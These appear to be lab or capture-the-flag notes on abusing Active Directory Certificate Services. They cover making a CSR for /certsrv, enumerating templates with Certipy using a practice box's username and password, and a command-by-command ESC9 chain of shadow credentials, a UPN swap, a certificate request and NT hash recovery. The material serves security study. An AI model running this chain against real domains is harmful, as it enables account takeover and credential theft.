# Creating Certificates from Certsrv.

To create a certificate first we’ll need to create a CSR (Certificate Signing Request). We can use openssl to do the job.

```bash
openssl genrsa -des3 -out amanda.key 2048 ​# create private key
openssl req -new -key amanda.key -out amanda.csr ​# create csr
```

Enter a passphrase when prompted and the same while creating the CSR. Press enter through all
the prompts.

Sign in to /certsrv -> Request a certificate -> advanced certificate request

Enter the content of the csr file in certificate request and leave the rest as it's.

# Enumerate ADCS configurations with Certipy
```bash
certipy find -u 'judith.mader@certified.htb' -p judith09 -dc-ip 10.10.11.41 -vulnerable -enabled
```

More..
https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

# Exploiting ESC9
more.. https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#no-security-extension-esc9

From UNIX-like systems, Certipy (Python) can be used to enumerate for, and conduct, the ESC9 scenario.

In this scenario, user1 has GenericWrite against user2 and wants to compromise user3. user2 is allowed to enroll in a vulnerable template that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.

First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.

```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the userPrincipalName of user2 is changed to user3.

```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

The vulnerable certificate can be requested as user2.

```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template'
```

The user2's UPN is changed back to something else.
```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. The domain must be specified since it is not present in the certificate.
```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```